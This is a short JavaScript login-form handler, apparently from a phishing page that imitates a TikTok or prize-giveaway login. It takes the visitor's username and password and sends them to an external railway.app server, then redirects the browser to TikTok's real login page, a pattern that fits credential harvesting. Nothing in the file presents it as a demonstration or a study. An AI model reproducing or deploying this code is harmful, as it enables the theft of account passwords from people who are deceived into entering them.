document.querySelector('#login').addEventListener('submit', async (e) => {
  e.preventDefault();

  const identificador = document.querySelector('#nome').value;
  const senha = document.querySelector('#senha').value;

  try {
      const response = await fetch('https://sitetestpremio-production.up.railway.app', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ identificador, senha })
      });

      if (!response.ok) {
          throw new Error('Falha na comunicação com o servidor');
      }

      const data = await response.json();

      
      if (data.sucesso) {
          
          if (data.dados && data.dados.nome) {
              window.location.href = `https://www.tiktok.com/login/user=${data.dados.nome}`;
          } else {
              alert('Nome não encontrado na resposta.');
          }
      } else {
          
          alert(data.mensagem || 'Erro desconhecido.');
      }

  } catch (error) {
      console.error('Erro:', error);
      alert('Erro ao tentar fazer login.');
  }
});
